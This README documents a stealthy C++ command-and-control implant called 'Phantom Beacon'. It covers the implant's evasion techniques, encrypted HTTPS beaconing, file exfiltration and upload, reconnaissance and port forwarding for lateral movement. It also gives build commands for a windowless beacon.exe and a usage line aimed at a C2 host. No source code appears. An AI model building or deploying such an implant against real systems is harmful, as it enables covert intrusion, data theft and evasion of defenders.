# Phantom Beacon — Advanced C++ Agent

## Overview
Highly performant, stealthy C++ beacon/implant for the Phantom C2 framework.

**Features:**
- **Evasion**: Dynamic API resolution via PEB walk (no static IAT), compile-time XOR string obfuscation
- **Crypto**: AES-256-CBC via Windows native BCrypt (CNG) — zero external dependencies
- **Network**: WinHTTP HTTPS client with user-agent rotation and sleep/jitter
- **Recon**: Logical drive enumeration, directory traversal, sensitive path detection
- **Port Forwarding**: Internal TCP relay for lateral movement
- **File Transfer**: Download/upload files from/to the target

## Building

### MSVC (Visual Studio)
```bat
mkdir build && cd build
cmake .. -G "Visual Studio 17 2022" -A x64
cmake --build . --config Release
```

### MinGW-w64 (Cross-compile from Linux)
```bash
mkdir build && cd build
cmake .. -DCMAKE_TOOLCHAIN_FILE=mingw-toolchain.cmake
make -j$(nproc)
```

### Direct compilation (no CMake)
```bat
cl /EHsc /O2 /std:c++17 /MT src/main.cpp /Fe:beacon.exe /link winhttp.lib bcrypt.lib ws2_32.lib /SUBSYSTEM:WINDOWS
```

## Usage
```
beacon.exe <c2_host> <c2_port>
beacon.exe 192.168.1.100 8443
```

## Supported Commands (from C2)

| Command | Description |
|---------|-------------|
| `recon [path]` | Full FS recon (drives + critical paths + optional dir listing) |
| `ls <path>` | List directory contents |
| `drives` | Enumerate logical drives |
| `whoami` | Get current user and computer name |
| `download <file>` | Exfiltrate a file (base64-encoded) |
| `upload <file> <b64>` | Write a file to the target |
| `portfwd <lport> <rhost> <rport>` | Start TCP port forward |
| `portfwd-stop` | Stop all active port forwards |
| `sleep <ms>` | Change beacon sleep interval |
| `exit` | Terminate the beacon |

## Architecture
```
main.cpp          Entry point + beacon loop + command dispatch
├── evasion.h     PEB walk, dynamic API resolution, XOR string obfuscation
├── crypto.h      AES-256-CBC (BCrypt), Base64, PKCS7
├── network.h     WinHTTP HTTPS client, sleep/jitter, UA rotation
├── recon.h       FS enumeration, critical path detection
└── portfwd.h     TCP port forwarding (Winsock2)
```
